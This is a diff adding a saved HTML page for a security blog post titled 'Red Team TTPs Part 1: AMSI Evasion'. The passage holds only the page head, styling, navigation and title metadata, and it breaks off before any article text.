@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="en-US"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=yes, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="IE=edge"><meta charset="UTF-8">
+<link rel="profile" href="http://gmpg.org/xfn/11">
+<link rel="pingback" href="https://0xdarkvortex.dev/xmlrpc.php">
+<title>Red Team TTPs Part 1: AMSI Evasion – 0xDarkVortex</title>
+<link rel="dns-prefetch" href="https://fonts.googleapis.com/">
+<link rel="dns-prefetch" href="https://s.w.org/">
+<link rel="alternate" type="application/rss+xml" title="0xDarkVortex » Feed" href="https://0xdarkvortex.dev/index.php/feed/">
+<link rel="alternate" type="application/rss+xml" title="0xDarkVortex » Comments Feed" href="https://0xdarkvortex.dev/index.php/comments/feed/">
+<link rel="alternate" type="application/rss+xml" title="0xDarkVortex » Red Team TTPs Part 1: AMSI Evasion Comments Feed" href="https://0xdarkvortex.dev/index.php/2019/07/17/red-team-ttps-part-1-amsi-evasion/feed/">
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/0xdarkvortex.dev\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.5.1"}};
+			!function(e,a,t){var r,n,o,i,p=a.createElement("canvas"),s=p.getContext&&p.getContext("2d");function c(e,t){var a=String.fromCharCode;s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,e),0,0);var r=p.toDataURL();return s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,t),0,0),r===p.toDataURL()}function l(e){if(!s||!s.fillText)return!1;switch(s.textBaseline="top",s.font="600 32px Arial",e){case"flag":return!c([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])&&(!c([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!c([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]));case"emoji":return!c([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}function d(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(i=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},o=0;o<i.length;o++)t.supports[i[o]]=l(i[o]),t.supports.everything=t.supports.everything&&t.supports[i[o]],"flag"!==i[o]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[i[o]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(r=t.source||{}).concatemoji?d(r.concatemoji):r.wpemoji&&r.twemoji&&(d(r.twemoji),d(r.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script><script src="Red%20Team%20TTPs%20Part%201%20AMSI%20Evasion%20%E2%80%93%200xDarkVortex_files/wp-emoji-release.js" type="text/javascript" defer="defer"></script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel="stylesheet" id="wp-block-library-css" href="Red%20Team%20TTPs%20Part%201%20AMSI%20Evasion%20%E2%80%93%200xDarkVortex_files/style_003.css" type="text/css" media="all">
+<link rel="stylesheet" id="mkaz-code-syntax-css-css" href="Red%20Team%20TTPs%20Part%201%20AMSI%20Evasion%20%E2%80%93%200xDarkVortex_files/blocks.css" type="text/css" media="all">
+<link rel="stylesheet" id="mkaz-code-syntax-prism-css-css" href="Red%20Team%20TTPs%20Part%201%20AMSI%20Evasion%20%E2%80%93%200xDarkVortex_files/prism.css" type="text/css" media="all">
+<link rel="stylesheet" id="anima-themefonts-css" href="Red%20Team%20TTPs%20Part%201%20AMSI%20Evasion%20%E2%80%93%200xDarkVortex_files/fontfaces.css" type="text/css" media="all">
+<link rel="stylesheet" id="anima-googlefonts-css" href="Red%20Team%20TTPs%20Part%201%20AMSI%20Evasion%20%E2%80%93%200xDarkVortex_files/css.css" type="text/css" media="all">
+<link rel="stylesheet" id="anima-main-css" href="Red%20Team%20TTPs%20Part%201%20AMSI%20Evasion%20%E2%80%93%200xDarkVortex_files/style.css" type="text/css" media="all">
+<style id="anima-main-inline-css" type="text/css">
+ body:not(.anima-landing-page) #container, #site-header-main-inside, #colophon-inside, #footer-inside, #breadcrumbs-container-inside, #header-page-title { margin: 0 auto; max-width: 1300px; } #site-header-main { left: 0; right: 0; } #primary { width: 320px; } #secondary { width: 270px; } #container.one-column .main { width: 100%; } #container.two-columns-right #secondary { float: right; } #container.two-columns-right .main, .two-columns-right #breadcrumbs { width: calc( 100% - 270px ); float: left; } #container.two-columns-left #primary { float: left; } #container.two-columns-left .main, .two-columns-left #breadcrumbs { width: calc( 100% - 320px ); float: right; } #container.three-columns-right #primary, #container.three-columns-left #primary, #container.three-columns-sided #primary { float: left; } #container.three-columns-right #secondary, #container.three-columns-left #secondary, #container.three-columns-sided #secondary { float: left; } #container.three-columns-right #primary, #container.three-columns-left #secondary { margin-left: 0%; margin-right: 0%; } #container.three-columns-right .main, .three-columns-right #breadcrumbs { width: calc( 100% - 590px ); float: left; } #container.three-columns-left .main, .three-columns-left #breadcrumbs { width: calc( 100% - 590px ); float: right; } #container.three-columns-sided #secondary { float: right; } #container.three-columns-sided .main, .three-columns-sided #breadcrumbs { width: calc( 100% - 590px ); float: right; } .three-columns-sided #breadcrumbs { margin: 0 calc( 0% + 270px ) 0 -1920px; } html { font-family: 'Raleway';font-weight:400; font-size: 15px; font-weight: 400; line-height: 1.8; } #site-title { font-family: Raleway; font-size: 120%; font-weight: 400; } #access ul li a { font-family: Raleway; font-size: 100%; font-weight: 300; } .widget-title { font-family: Roboto; font-size: 100%; font-weight: 700; } .widget-container { font-family: Raleway; font-size: 100%; font-weight: 400; } .entry-title, #reply-title { font-family: Raleway; font-size: 250%; font-weight: 300; } .entry-meta > span, .post-continue-container { font-family: Roboto; font-size: 100%; font-weight: 300; } .page-link, .pagination, #author-info #author-link, .comment .reply a, .comment-meta, .byline { font-family: Roboto; } .content-masonry .entry-title { font-size: 175%; } h1 { font-size: 2.33em; } h2 { font-size: 2.06em; } h3 { font-size: 1.79em; } h4 { font-size: 1.52em; } h5 { font-size: 1.25em; } h6 { font-size: 0.98em; } h1, h2, h3, h4, h5, h6, .seriousslider-theme .seriousslider-caption-title { font-family: Raleway; font-weight: 300; } body { color: #dbdbdb; background-color: #FFF; } #site-header-main, #access ul ul, .menu-search-animated .searchform input[type="search"], #access .menu-search-animated .searchform, #access::after, .anima-over-menu .header-fixed#site-header-main, .anima-over-menu .header-fixed#site-header-main #access:after { background-color: #FFFFFF; } #site-header-main { border-bottom-color: rgba(0,0,0,.05); } .anima-over-menu .header-fixed#site-header-main #site-title a { color: #D0422C; } #access > div > ul > li, #access > div > ul > li > a, .anima-over-menu .header-fixed#site-header-main #access > div > ul > li:not([class*='current']), .anima-over-menu .header-fixed#site-header-main #access > div > ul > li:not([class*='current']) > a, .anima-over-menu .header-fixed#site-header-main #sheader.socials a::before, #sheader.socials a::before, #access .menu-search-animated .searchform input[type="search"], #mobile-menu { color: #dd3333; } .anima-over-menu .header-fixed#site-header-main #sheader.socials a:hover::before, #sheader.socials a:hover::before { color: #FFFFFF; } #access ul.sub-menu li a, #access ul.children li a { color: #a32525; } #access ul.sub-menu li a, #access ul.children li a { background-color: #FFFFFF; } #access > div > ul > li:hover > a, #access > div > ul > li a:hover, #access > div > ul > li:hover, .anima-over-menu .header-fixed#site-header-main #access > div > ul > li > a:hover, .anima-over-menu .header-fixed#site-header-main #access > div > ul > li:hover { color: #D0422C; } #access > div > ul > li > a > span::before { background-color: #D0422C; } #site-title::before { background-color: #777777; } #access > div > ul > li.current_page_item > a, #access > div > ul > li.current-menu-item > a, #access > div > ul > li.current_page_ancestor > a, #access > div > ul > li.current-menu-ancestor > a, #access .sub-menu, #access .children, .anima-over-menu .header-fixed#site-header-main #access > div > ul > li > a { color: #777777; } #access ul.children > li.current_page_item > a, #access ul.sub-menu > li.current-menu-item > a, #access ul.children > li.current_page_ancestor > a, #access ul.sub-menu > li.current-menu-ancestor > a { color: #777777; } .searchform .searchsubmit { color: #dbdbdb; } body:not(.anima-landing-page) article.hentry, body:not(.anima-landing-page) .main { background-color: #000000; } .pagination, .page-link { border-color: #111111; } .post-thumbnail-container .featured-image-meta, body:not(.single) article.hentry .post-thumbnail-container > a::after, #header-page-title-inside { background-color: rgba(0,0,0, 0.5); } #header-page-title-inside { box-shadow: 0 -70px 70px rgba(0,0,0,0.2) inset; } #header-page-title .entry-meta .bl_categ a { background-color: #D0422C; } #header-page-title .entry-meta .bl_categ a:hover { background-color: #e1533d; } .anima-normal-titles #breadcrumbs-container { background-color: #060606; } #colophon, #footer { background-color: #050505; color: #AAAAAA; } #footer { background: #000000; } .entry-title a:active, .entry-title a:hover { color: #D0422C; } .entry-title a:hover { border-bottom-color: #D0422C; } span.entry-format { color: #D0422C; } .format-aside { border-top-color: #000000; } article.hentry .post-thumbnail-container { background-color: rgba(219,219,219,0.15); } .entry-content blockquote::before, .entry-content blockquote::after { color: rgba(219,219,219,0.2); } .entry-content h5, .entry-content h6, .lp-text-content h5, .lp-text-content h6 { color: #777777; } .entry-content h1, .entry-content h2, .entry-content h3, .entry-content h4, .lp-text-content h1, .lp-text-content h2, .lp-text-content h3, .lp-text-content h4 { color: #dd3333; } a { color: #D0422C; } a:hover, .entry-meta span a:hover { color: #777777; } .post-continue-container span.comments-link:hover, .post-continue-container span.comments-link a:hover { color: #D0422C; } .socials a:before { color: #D0422C; background: #0a0a0a; } .socials a:hover:before { background-color: #D0422C; color: #000000; } #sheader .socials a:before { background: #f5f5f5; } #sheader .socials a:hover:before { background-color: #D0422C; color: #FFFFFF; } #footer .socials a:before { background: #0f0f0f; } #footer .socials a:hover:before { background-color: #D0422C; color: #050505; } .anima-normalizedtags #content .tagcloud a { color: #000000; background-color: #D0422C; } .anima-normalizedtags #content .tagcloud a:hover { background-color: #777777; } #toTop { background-color: rgba(230,230,230,0.5); color: #D0422C; } #nav-fixed i, #nav-fixed span { background-color: rgba(215,215,215,0.5); } #nav-fixed i { color: #FFF; } #toTop:hover { background-color: #D0422C; color: #FFF; } a.continue-reading-link { background-color:#101010; } .continue-reading-link::after { background-color: #D0422C; color: #000000; } .entry-meta .icon-metas:before { color: #ffffff; } .anima-caption-one .main .wp-caption .wp-caption-text { border-bottom-color: #111111; } .anima-caption-two .main .wp-caption .wp-caption-text { background-color: #0a0a0a; } .anima-image-one .entry-content img[class*="align"], .anima-image-one .entry-summary img[class*="align"], .anima-image-two .entry-content img[class*='align'], .anima-image-two .entry-summary img[class*='align'] { border-color: #111111; } .anima-image-five .entry-content img[class*='align'], .anima-image-five .entry-summary img[class*='align'] { border-color: #D0422C; } /* diffs */ span.edit-link a.post-edit-link, span.edit-link a.post-edit-link:hover, span.edit-link .icon-edit:before { color: #969696; } .searchform { border-color: #141414; } .entry-meta span, .entry-meta a, .entry-utility span, .entry-utility a, .entry-meta time, #breadcrumbs-nav, #header-page-title .byline, .footermenu ul li span.sep { color: #ffffff; } .footermenu ul li a::after { background: #777777; } #breadcrumbs-nav a { color: #ffffff; } .entry-meta span.entry-sticky { background-color: #ffffff; color: #000000; } #commentform { max-width:650px;} code, #nav-below .nav-previous a:before, #nav-below .nav-next a:before { background-color: #111111; } pre, .page-link > span, .comment-author, .commentlist .comment-body, .commentlist .pingback { border-color: #111111; } .commentlist .comment-body::after { border-top-color: #000000; } .commentlist .comment-body::before { border-top-color: #1b1b1b; } article #author-info { border-top-color: #111111; } .page-header.pad-container { border-bottom-color: #111111; } .comment-meta a { color: #ffffff; } .commentlist .reply a { color: #ffffff; background-color: #0c0c0c; } select, input[type], textarea { color: #dbdbdb; border-color: #111111; background-color: #0f0f0f; } input[type]:hover, textarea:hover, select:hover, input[type]:focus, textarea:focus, select:focus { background: #070707; } button, input[type="button"], input[type="submit"], input[type="reset"] { background-color: #D0422C; color: #000000; } button:hover, input[type="button"]:hover, input[type="submit"]:hover, input[type="reset"]:hover { background-color: #777777; } hr { background-color: #0f0f0f; } /* gutenberg */ .wp-block-image.alignwide { margin-left: calc( ( 0% + 2.5em ) * -1 ); margin-right: calc( ( 0% + 2.5em ) * -1 ); } .wp-block-image.alignwide img { width: calc( 100% + 5em ); max-width: calc( 100% + 5em ); } .has-accent-1-color, .has-accent-1-color:hover { color: #D0422C; } .has-accent-2-color, .has-accent-2-color:hover { color: #777777; } .has-headings-color, .has-headings-color:hover { color: #dd3333; } .has-sitetext-color, .has-sitetext-color:hover { color: #dbdbdb; } .has-sitebg-color, .has-sitebg-color:hover { color: #000000; } .has-accent-1-background-color { background-color: #D0422C; } .has-accent-2-background-color { background-color: #777777; } .has-headings-background-color { background-color: #dd3333; } .has-sitetext-background-color { background-color: #dbdbdb; } .has-sitebg-background-color { background-color: #000000; } .has-small-font-size { font-size: 9px; } .has-regular-font-size { font-size: 15px; } .has-large-font-size { font-size: 24px; } .has-larger-font-size { font-size: 38px; } .has-huge-font-size { font-size: 38px; } /* woocommerce */ .woocommerce-page #respond input#submit, .woocommerce a.button, .woocommerce-page button.button, .woocommerce input.button, .woocommerce #respond input#submit, .woocommerce a.button, .woocommerce button.button, .woocommerce input.button { background-color: #D0422C; color: #000000; line-height: 1.8; border-radius: 4px;} .woocommerce #respond input#submit:hover, .woocommerce a.button:hover, .woocommerce button.button:hover, .woocommerce input.button:hover { background-color: #f2644e; color: #000000;} .woocommerce-page #respond input#submit.alt, .woocommerce a.button.alt, .woocommerce-page button.button.alt, .woocommerce input.button.alt { background-color: #777777; color: #000000; line-height: 1.8; border-radius: 4px;} .woocommerce-page #respond input#submit.alt:hover, .woocommerce a.button.alt:hover, .woocommerce-page button.button.alt:hover, .woocommerce input.button.alt:hover { background-color: #999999; color: #000000;} .woocommerce div.product .woocommerce-tabs ul.tabs li.active { border-bottom-color: #000000; } .woocommerce #respond input#submit.alt.disabled, .woocommerce #respond input#submit.alt.disabled:hover, .woocommerce #respond input#submit.alt:disabled, .woocommerce #respond input#submit.alt:disabled:hover, .woocommerce #respond input#submit.alt[disabled]:disabled, .woocommerce #respond input#submit.alt[disabled]:disabled:hover, .woocommerce a.button.alt.disabled, .woocommerce a.button.alt.disabled:hover, .woocommerce a.button.alt:disabled, .woocommerce a.button.alt:disabled:hover, .woocommerce a.button.alt[disabled]:disabled, .woocommerce a.button.alt[disabled]:disabled:hover, .woocommerce button.button.alt.disabled, .woocommerce button.button.alt.disabled:hover, .woocommerce button.button.alt:disabled, .woocommerce button.button.alt:disabled:hover, .woocommerce button.button.alt[disabled]:disabled, .woocommerce button.button.alt[disabled]:disabled:hover, .woocommerce input.button.alt.disabled, .woocommerce input.button.alt.disabled:hover, .woocommerce input.button.alt:disabled, .woocommerce input.button.alt:disabled:hover, .woocommerce input.button.alt[disabled]:disabled, .woocommerce input.button.alt[disabled]:disabled:hover { background-color: #777777; } .woocommerce ul.products li.product .price, .woocommerce div.product p.price, .woocommerce div.product span.price { color: #ffffff } #add_payment_method #payment, .woocommerce-cart #payment, .woocommerce-checkout #payment { background: #0a0a0a; } /* mobile menu */ nav#mobile-menu { background-color: #FFFFFF; } #mobile-menu .mobile-arrow { color: #dbdbdb; } .main .entry-content, .main .entry-summary { text-align: inherit; } .main p, .main ul, .main ol, .main dd, .main pre, .main hr { margin-bottom: 1em; } .main p { text-indent: 0em; } .main a.post-featured-image { background-position: center center; } #header-widget-area { width: 33%; right: 10px; } .anima-stripped-table .main thead th, .anima-bordered-table .main thead th, .anima-stripped-table .main td, .anima-stripped-table .main th, .anima-bordered-table .main th, .anima-bordered-table .main td { border-color: #161616; } .anima-clean-table .main th, .anima-stripped-table .main tr:nth-child(even) td, .anima-stripped-table .main tr:nth-child(even) th { background-color: #090909; } article.hentry .article-inner, #content-masonry article.hentry .article-inner { padding: 0%; } #site-header-main { height:85px; } #access .menu-search-animated .searchform { height: 84px; line-height: 84px; } .anima-over-menu .staticslider-caption-container { padding-top: 85px; } .menu-search-animated, #sheader-container, .identity, #nav-toggle { height:85px; line-height:85px; } #access div > ul > li > a { line-height:85px; } #branding { height:85px; } .anima-responsive-headerimage #masthead #header-image-main-inside { max-height: 300px; } .anima-cropped-headerimage #masthead #header-image-main-inside { height: 300px; } #masthead #site-header-main { position: fixed; } .anima-fixed-menu #header-image-main { margin-top: 85px; } @media (min-width: 1152px) { body:not(.anima-landing-page) #masthead { border-bottom: 1px solid #eeeeee; } } @media (max-width: 640px) { #header-page-title .entry-title { font-size: 200%; } } .lp-staticslider .staticslider-caption, .lp-dynamic-slider, .seriousslider-theme .seriousslider-caption, .anima-landing-page .lp-blocks-inside, .anima-landing-page .lp-boxes-inside, .anima-landing-page .lp-text-inside, .anima-landing-page .lp-posts-inside, .anima-landing-page .lp-page-inside, .anima-landing-page .lp-section-header, .anima-landing-page .content-widget { max-width: 1300px; } .anima-landing-page .content-widget { margin: 0 auto; } .seriousslider-theme .seriousslider-caption-buttons a, a[class^="staticslider-button"] { font-size: 15px; } .seriousslider-theme .seriousslider-caption-buttons a:nth-child(2n+1), a.staticslider-button:nth-child(2n+1) { background-color: #D0422C; border-color: #D0422C; color: #000000; } .seriousslider-theme .seriousslider-caption-buttons a:nth-child(2n+1):hover, .staticslider-button:nth-child(2n+1):hover { color: #D0422C; } .seriousslider-theme .seriousslider-caption-buttons a:nth-child(2n+2), a.staticslider-button:nth-child(2n+2) { color: #777777; border-color: #777777; } .seriousslider-theme .seriousslider-caption-buttons a:nth-child(2n+2):hover, a.staticslider-button:nth-child(2n+2):hover { background-color: #777777; color: #000000; } .lp-block i { border-color: #ffffff; } .lp-block:hover i { border-color: #D0422C; } .lp-block > i::before { color: #D0422C; border-color: #e9e9e9; background-color: #ffffff; } .lp-block:hover i::before { color: #D0422C; } .lp-block i:after { background-color: #D0422C; } .lp-block:hover i:after { background-color: #777777; } .lp-block-text, .lp-boxes-static .lp-box-text, .lp-section-desc, .staticslider-caption-text { color: #ffffff; } .lp-blocks { background-color: #F8F8F8; } .lp-boxes { background-color: #FFFFFF; } .lp-text { background-color: #F8F8F8; } .staticslider-caption-container, .lp-slider-wrapper { background-color: #FFFFFF; } .seriousslider-theme .seriousslider-caption { color: #F8F8F8; } .lp-boxes-1 .lp-box .lp-box-image { height: 350px; } .lp-boxes-1.lp-boxes-animated .lp-box:hover .lp-box-text { max-height: 250px; } .lp-boxes-2 .lp-box .lp-box-image { height: 400px; } .lp-boxes-2.lp-boxes-animated .lp-box:hover .lp-box-text { max-height: 300px; } .lp-box-readmore:hover { color: #D0422C; } .lp-boxes .lp-box-overlay { background-color: rgba(208,66,44, 0.8); } .lp-boxes:not(.lp-boxes-static2) .lp-box-overlay:hover { background-color: rgba(208,66,44, 1); } #lp-posts, #lp-page { background-color: #000000; } #cryout_ajax_more_trigger { background-color: #D0422C; color: #000000;} .lpbox-rnd1 { background-color: #c8c8c8; } .lpbox-rnd2 { background-color: #c3c3c3; } .lpbox-rnd3 { background-color: #bebebe; } .lpbox-rnd4 { background-color: #b9b9b9; } .lpbox-rnd5 { background-color: #b4b4b4; } .lpbox-rnd6 { background-color: #afafaf; } .lpbox-rnd7 { background-color: #aaaaaa; } .lpbox-rnd8 { background-color: #a5a5a5; } 
+</style>
+<link rel="stylesheet" id="cryout-serious-slider-style-css" href="Red%20Team%20TTPs%20Part%201%20AMSI%20Evasion%20%E2%80%93%200xDarkVortex_files/style_002.css" type="text/css" media="all">
+<!--[if lt IE 9]>
+<script type='text/javascript' src='https://0xdarkvortex.dev/wp-content/themes/anima/resources/js/html5shiv.min.js?ver=1.4.0' id='anima-html5shiv-js'></script>
+<![endif]-->
+<script type="text/javascript" src="Red%20Team%20TTPs%20Part%201%20AMSI%20Evasion%20%E2%80%93%200xDarkVortex_files/jquery_003.js" id="jquery-core-js"></script>
+<script type="text/javascript" src="Red%20Team%20TTPs%20Part%201%20AMSI%20Evasion%20%E2%80%93%200xDarkVortex_files/jquery.js" id="cryout-serious-slider-jquerymobile-js"></script>
+<script type="text/javascript" src="Red%20Team%20TTPs%20Part%201%20AMSI%20Evasion%20%E2%80%93%200xDarkVortex_files/slider.js" id="cryout-serious-slider-script-js"></script>
+<link rel="https://api.w.org/" href="https://0xdarkvortex.dev/index.php/wp-json/"><link rel="alternate" type="application/json" href="https://0xdarkvortex.dev/index.php/wp-json/wp/v2/posts/2799"><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://0xdarkvortex.dev/xmlrpc.php?rsd">
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://0xdarkvortex.dev/wp-includes/wlwmanifest.xml"> 
+<link rel="prev" title="Windows Shellcoding x86 – Calling Functions in Kernel32.dll – Part 2" href="https://0xdarkvortex.dev/index.php/2019/04/01/windows-shellcoding-x86-calling-functions-in-kernel32-dll-part-2/">
+<link rel="next" title="Red Team TTPs Part 2: PUSH 0xPE, CALL 0xLOADER" href="https://0xdarkvortex.dev/index.php/2020/10/08/red-team-ttps-part-2-push-0xpe-call-0xloader/">
+<meta name="generator" content="WordPress 5.5.1">
+<link rel="canonical" href="https://0xdarkvortex.dev/index.php/2019/07/17/red-team-ttps-part-1-amsi-evasion/">
+<link rel="shortlink" href="https://0xdarkvortex.dev/?p=2799">
+<link rel="alternate" type="application/json+oembed" href="https://0xdarkvortex.dev/index.php/wp-json/oembed/1.0/embed?url=https%3A%2F%2F0xdarkvortex.dev%2Findex.php%2F2019%2F07%2F17%2Fred-team-ttps-part-1-amsi-evasion%2F">
+<!-- Analytics by WP-Statistics v12.6.13 - https://wp-statistics.com/ -->
+<link rel="author" href="https://0xdarkvortex.dev/"><style type="text/css" id="custom-background-css">
+body.custom-background { background-image: url("https://0xdarkvortex.dev/wp-content/uploads/2020/07/IMG_20200727_203906.jpg"); background-position: left center; background-size: cover; background-repeat: no-repeat; background-attachment: fixed; }
+</style>
+	<link rel="icon" href="https://0xdarkvortex.dev/wp-content/uploads/2019/05/circuit-icon-18692-Windows.ico" sizes="32x32">
+<link rel="icon" href="https://0xdarkvortex.dev/wp-content/uploads/2019/05/circuit-icon-18692-Windows.ico" sizes="192x192">
+<link rel="apple-touch-icon" href="https://0xdarkvortex.dev/wp-content/uploads/2019/05/circuit-icon-18692-Windows.ico">
+<meta name="msapplication-TileImage" content="https://0xdarkvortex.dev/wp-content/uploads/2019/05/circuit-icon-18692-Windows.ico">
+		<style type="text/css" id="wp-custom-css">
+			#site-header-main, #access ul ul, .menu-search-animated .searchform input[type="search"], #access .menu-search-animated .searchform, #access::after, .anima-over-menu .header-fixed#site-header-main, .anima-over-menu .header-fixed#site-header-main #access::after {
+
+    background-color: #1d2527;
+
+}		</style>
+		<style id="fit-vids-style">.fluid-width-video-wrapper{width:100%;position:relative;padding:0;}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper object,.fluid-width-video-wrapper embed {position:absolute;top:0;left:0;width:100%;height:100%;}</style></head>
+
+<body class="post-template-default single single-post postid-2799 single-format-standard custom-background wp-custom-logo wp-embed-responsive anima-image-five anima-caption-one anima-totop-normal anima-stripped-table anima-fixed-menu anima-cropped-headerimage anima-responsive-featured anima-magazine-two anima-magazine-layout anima-comment-placeholder anima-header-titles anima-normalizedtags anima-article-animation-slideLeft" itemscope="" itemtype="http://schema.org/WebPage">
+	<div id="site-wrapper">
+	<header id="masthead" class="cryout" itemscope="" itemtype="http://schema.org/WPHeader" role="banner">
+
+		<div id="site-header-main" class="header-fixed">
+			<div id="site-header-main-inside">
+
+				<nav id="mobile-menu">
+					<span id="nav-cancel"><i class="icon-cancel"></i></span>
+					<div id="mobile-nav"><ul>
+<li><a href="https://0xdarkvortex.dev/"><span>Home</span></a></li><li class="page_item page-item-2"><a href="https://0xdarkvortex.dev/index.php/paranoid-ninja/"><span>Paranoid Ninja</span></a></li>
+<li class="page_item page-item-2993"><a href="https://0xdarkvortex.dev/index.php/winsaafman/"><span>Winsaafman</span></a></li>
+</ul></div>
+				</nav> <!-- #mobile-menu -->
+
+				<div id="branding">
+					<div class="identity"><a href="https://0xdarkvortex.dev/" id="logo" class="custom-logo-link" title="0xDarkVortex" rel="home"><img src="Red%20Team%20TTPs%20Part%201%20AMSI%20Evasion%20%E2%80%93%200xDarkVortex_files/imageedit_3_8921354725.png" class="custom-logo" alt="0xDarkVortex" srcset="https://0xdarkvortex.dev/wp-content/uploads/2019/05/imageedit_3_8921354725.png 512w, https://0xdarkvortex.dev/wp-content/uploads/2019/05/imageedit_3_8921354725-150x150.png 150w, https://0xdarkvortex.dev/wp-content/uploads/2019/05/imageedit_3_8921354725-300x300.png 300w, https://0xdarkvortex.dev/wp-content/uploads/2019/05/imageedit_3_8921354725-350x350.png 350w" sizes="(max-width: 512px) 100vw, 512px"></a></div><div id="site-text"><div itemprop="headline" id="site-title"><span> <a href="https://0xdarkvortex.dev/" title="Out of the void, into the vortex" rel="home">0xDarkVortex</a> </span></div><span id="site-description" itemprop="description">Out of the void, into the vortex</span></div>				</div><!-- #branding -->
+
+				<div id="sheader-container">
+									</div>
+
+				<a id="nav-toggle"><i class="icon-menu"></i></a>
+				<nav id="access" role="navigation" aria-label="Primary Menu" itemscope="" itemtype="http://schema.org/SiteNavigationElement">
+						<div class="skip-link screen-reader-text">
+		<a href="#main" title="Skip to content"> Skip to content </a>
+	</div>
+	<div id="prime_nav"><ul>
+<li><a href="https://0xdarkvortex.dev/"><span>Home</span></a></li><li class="page_item page-item-2"><a href="https://0xdarkvortex.dev/index.php/paranoid-ninja/"><span>Paranoid Ninja</span></a></li>
+<li class="page_item page-item-2993"><a href="https://0xdarkvortex.dev/index.php/winsaafman/"><span>Winsaafman</span></a></li>
+</ul></div>
+				</nav><!-- #access -->
+
+			</div><!-- #site-header-main-inside -->
+		</div><!-- #site-header-main -->
+
+		<div id="header-image-main">
+			<div id="header-image-main-inside">
+				    <div id="header-page-title">
+        <div id="header-page-title-inside">
+            <h1 class="entry-title" itemprop="headline">Red Team TTPs Part 1: AMSI Evasion</h1>            <div class="entry-meta aftertitle-meta">
+                <span class="author vcard" itemscope="" itemtype="http://schema.org/Person" itemprop="author"><img alt="" src="Red%20Team%20TTPs%20Part%201%20AMSI%20Evasion%20%E2%80%93%200xDarkVortex_files/8cbcc0bc2bbd045be1578b18e8babb74.jpg" srcset="https://secure.gravatar.com/avatar/8cbcc0bc2bbd045be1578b18e8babb74?s=192&amp;d=mm&amp;r=g 2x" class="avatar avatar-96 photo" loading="lazy" width="96" height="96"><em>Posted by </em><a class="url fn n" rel="author" href="https://0xdarkvortex.dev/index.php/author/paranoidninja/" title="View all posts by paranoidninja" itemprop="url">
+					<em itemprop="name">paranoidninja</em>
+				</a> <em>on</em></span>
+		<span class="onDate date">
+				<i class="icon-date icon-metas" title="Date"></i>
+				<time class="published" datetime="2019-07-17T04:34:32+05:30" itemprop="datePublished">
+					July 17, 2019				</time>
+				<time class="updated" datetime="2020-10-09T10:58:28+05:30" itemprop="dateModified">October 9, 2020</time>
+		</span>
+		<span class="bl_categ">
+					<i class="icon-category icon-metas" title="Categories"></i> <a href="https://0xdarkvortex.dev/index.php/category/blogs-by-paranoid-ninja/" rel="category tag">Blogs by Paranoid Ninja</a> <span class="sep">/</span> <a href="https://0xdarkvortex.dev/index.php/category/malware-development/" rel="category tag">Malware Development</a> <span class="sep">/</span> <a href="https://0xdarkvortex.dev/index.php/category/windows/" rel="category tag">Windows</a></span>            </div><!-- .entry-meta -->
+            <div id="breadcrumbs-container" class="cryout one-column"><div id="breadcrumbs-container-inside"><div id="breadcrumbs"> <nav id="breadcrumbs-nav" itemprop="breadcrumb"><a href="https://0xdarkvortex.dev/" title="Home"><i class="icon-bread-home"></i><span class="screen-reader-text">Home</span></a><i class="icon-bread-arrow"></i> <a href="https://0xdarkvortex.dev/index.php/category/blogs-by-paranoid-ninja/">Blogs by Paranoid Ninja</a> <i class="icon-bread-arrow"></i> <span class="current">Red Team TTPs Part 1: AMSI Evasion</span></nav></div></div></div><!-- breadcrumbs -->        </div>
+    </div> 			</div><!-- #header-image-main-inside -->
+		</div><!-- #header-image-main -->
+
+	</header><!-- #masthead -->
+
+	
+	
+	<div id="content" class="cryout">
+			<nav id="nav-fixed" class="nav-fixed-show">
+		<div class="nav-previous"><a href="https://0xdarkvortex.dev/index.php/2019/04/01/windows-shellcoding-x86-calling-functions-in-kernel32-dll-part-2/" rel="prev"><i class="icon-continue-reading"></i><span>Windows Shellcoding x86 – Calling Functions in Kernel32.dll – Part 2</span></a></div>
+		<div class="nav-next"><a href="https://0xdarkvortex.dev/index.php/2020/10/08/red-team-ttps-part-2-push-0xpe-call-0xloader/" rel="next"><span>Red Team TTPs Part 2: PUSH 0xPE, CALL 0xLOADER</span><i class="icon-continue-reading"></i></a></div>
+	</nav>
+<div id="container" class="one-column">
+	<main id="main" role="main" class="main">
+				<aside class="content-widget content-widget-before" itemscope="" itemtype="http://schema.org/WPSideBar">
